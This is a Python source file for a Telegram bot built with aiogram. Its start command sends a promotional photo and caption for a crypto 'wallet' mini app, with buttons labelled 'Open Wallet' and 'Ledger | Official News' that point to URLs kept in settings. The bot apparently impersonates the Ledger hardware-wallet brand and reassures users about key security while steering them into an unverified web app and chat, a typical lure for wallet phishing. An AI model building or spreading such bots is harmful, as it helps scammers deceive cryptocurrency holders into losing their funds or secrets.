import os
from aiogram import Bot, Router, F
from aiogram.types import Message, CallbackQuery
from aiogram.filters import Command, CommandStart
from aiogram.utils.keyboard import InlineKeyboardBuilder
from aiogram.types.web_app_info import WebAppInfo
from bot_app.config import settings
from aiogram.types import FSInputFile
url = settings.url
private_router = Router()
START_PHOTO_ID = None

def web_kb(data: dict[str, str]):
    builder = InlineKeyboardBuilder()
    for text, value in data.items():
        if value == "web":
            builder.button(text=text, web_app=WebAppInfo(url=settings.url))
        else:
            builder.button(text=text, url=settings.chat_url)

    return builder.adjust(1).as_markup()


text = """What's inside our mini app?

✨ Total portfolio control: track your bags, asset spread, and tx history in real-time.
📊 Market analytics: monitor crypto prices, charts, and trends straight from the wallet ui.
📝 Built-in tax reports: auto-calculates short and long-term gains for easy tax prep (taxation is theft, but audits are worse).
⚙️ Deep customization: tweak widgets, pick your fiat, and manage how your data displays.

🔒The kicker: your private keys stay locked on your ledger. we just ported the convenience of the ui to telegram while keeping security at absolute max. 🔒"""


@private_router.message(Command("start"))
async def cmd_start(message: Message):
    global START_PHOTO_ID

    if START_PHOTO_ID:
        try:
            await message.answer_photo(photo=START_PHOTO_ID, caption=text,reply_markup=web_kb({'Open Wallet': 'web', "Ledger | Official News": 'url'}))
            return
        except Exception:
            # Если Telegram вдруг скажет "Invalid file_id", сбросим его
            START_PHOTO_ID = None

    photo = FSInputFile("bot_app/assets/main_photo.jpg")
    msg = await message.answer_photo(photo=photo, caption=text,reply_markup=web_kb({'Open Wallet': 'web', "Ledger | Official News": 'url'}))

    START_PHOTO_ID = msg.photo[-1].file_id
